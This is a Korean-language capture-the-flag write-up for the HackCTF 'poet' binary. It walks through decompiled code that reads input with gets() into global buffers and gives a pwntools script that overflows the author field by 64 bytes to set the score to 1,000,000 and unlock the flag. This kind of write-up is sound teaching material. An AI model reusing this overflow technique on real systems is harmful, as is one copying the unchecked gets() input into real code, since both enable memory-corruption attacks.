# Poet

```c
✘ kimdong@ubuntu  ~/Wargame/200~250  file poet
poet: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=65fc088e5fe2995da2cc64236196b75a60dc76f0, not stripped

kimdong@ubuntu  ~/Wargame/200~250  checksec poet
[*] '/home/kimdong/Wargame/200~250/poet'
   Arch:     amd64-64-little
   RELRO:    Partial RELRO
   Stack:    No canary found
   NX:       NX enabled
   PIE:      No PIE (0x400000)
```
이번 바이너리 파일은 64-bit이고, mitigation은 NX-bit가 설정되어있어서, shellcode를 입력하는 방식은 불가능할것으로 보인다.<br>

```c
kimdong@ubuntu  ~/Wargame/200~250  ./poet       

**********************************************************
*     우리는 2018년의 시인(poet)을 찾고 있습니다.        *
*  플래그상을 받고 싶다면 지금 한 줄의 시를 쓰세요!      *
**********************************************************

Enter :
> 1234
이 시의 저자는 누구입니까?
> 1234

+---------------------------------------------------------------------------+
시 내용
1234
점수:0

음...이 시로는 충분하지가 않습니다.
정확히 1,000,000 점을 획득해야만 됩니다.
다시 시도해주세요!
+---------------------------------------------------------------------------+
```
실행시켜보면, 문자열이 출력되고, 사용자의 입력값을 받고, 다시 문자열이 출력된후, 다시 사용자의 입력값을 검증하는 방식이다.<br>

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  const char *v3; // rdi

  setvbuf(_bss_start, 0LL, 2, 0LL);
  v3 = s;
  puts(s);
  while ( 1 )
  {
    get_poem(v3);
    get_author(v3);
    rate_poem(v3);
    if ( dword_6024E0 == 1000000 )
      break;
    v3 = asc_400D78;
    puts(asc_400D78);
  }
  reward(v3);
}
```
main문은 다음과 같이 생겼다.<br>
dword_6024E0이 1000000이면, while()문을 탈출하는 형식이다.<br>
reward함수는 다음과 같다.<br>

```c
void __noreturn reward()
{
  char s; // [rsp+0h] [rbp-90h]
  FILE *stream; // [rsp+88h] [rbp-8h]

  stream = fopen("./flag.txt", "r");
  fgets(&s, 128, stream);
  printf(format, &unk_6024A0, &s);
  exit(0);
}
```
flag를 띄워주는 함수로, main문에서 특정조건을 만족시켜야 할것으로 보인다.<br>

```c
__int64 get_poem()
{
  __int64 result; // rax

  printf("Enter :\n> ");
  result = gets(poem);
  dword_6024E0 = 0;
  return result;
}

__int64 get_author()
{
  printf(&byte_400C38);
  return gets(&unk_6024A0);
}

int rate_poem()
{
  char dest; // [rsp+0h] [rbp-410h]
  char *s1; // [rsp+408h] [rbp-8h]

  strcpy(&dest, poem);
  for ( s1 = strtok(&dest, " \n"); s1; s1 = strtok(0LL, " \n") )
  {
    if ( !strcmp(s1, "ESPR")
      || !strcmp(s1, "eat")
      || !strcmp(s1, "sleep")
      || !strcmp(s1, "pwn")
      || !strcmp(s1, "repeat")
      || !strcmp(s1, "CTF")
      || !strcmp(s1, "capture")
      || !strcmp(s1, "flag") )
    {
      dword_6024E0 += 100;
    }
  }
  return printf(asc_400BC0, poem, (unsigned int)dword_6024E0);
}

```
`rate_poem`에서 보면 `dword_6024E0`이 score로 보인다.<br>

`get_poem`에서 입력값을 result에 넣어주고, get_author에서 받은 입력값을 `&unk_6024A0`에 저장시켜준다.<br>

unk_6024A0는 bss영역으로 주소지는 다음과 같다 `.bss:00000000006024A0`<br>

최종적으로 score를 저장하는 `dword_6024E0`의 주소지는 `.bss:00000000006024E0`와 같다.<br>

특정 문자열을 입력해주면, 100점씩 추가되는데 그 방법으로는 백만점을 얻을수 없을것으로 보인다.<br>

따라서 bss영역을 덮어씌워서 `dword_6024E0`을 백만점으로 덮어씌우면 문제가 해결가능할것으로 보인다.<br>

두 영역사이의 거리는 '6024E0-6024A0'으로 64Byte이다.<br>

따라서, 64Byte의 더미값으로 채운뒤에,백만점을 넣으면 문제가 해결가능하다.<br>

처음 사용자 입력값에는 아무값이나 넣어주고, 뒤에 입력값에 위에서말한 payload를 넣어주면 될것같다.<br>

---
## Exploit Code

```c
from pwn import *
p = remote("ctf.j0n9hyun.xyz",3012)
payload1 = "dkanrjsk"
payload2 = "A"*64
payload2 += p64(1000000)

p.recvuntil("> ")
p.sendline(payload1)
p.recvuntil("> ")
p.sendline(payload2)
p.interactive()
```
```c
kimdong@ubuntu  ~/Wargame/200~250  python poet_ex.py
[+] Opening connection to ctf.j0n9hyun.xyz on port 3012: Done
[*] Switching to interactive mode

+---------------------------------------------------------------------------+
시 내용
dkanrjsk
점수:1000000

축하합니다!

시 내용
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

2018년 시인 상을 받았습니다!!

보상:
HackCTF{}

+---------------------------------------------------------------------------+

[*] Got EOF while reading in interactive
```
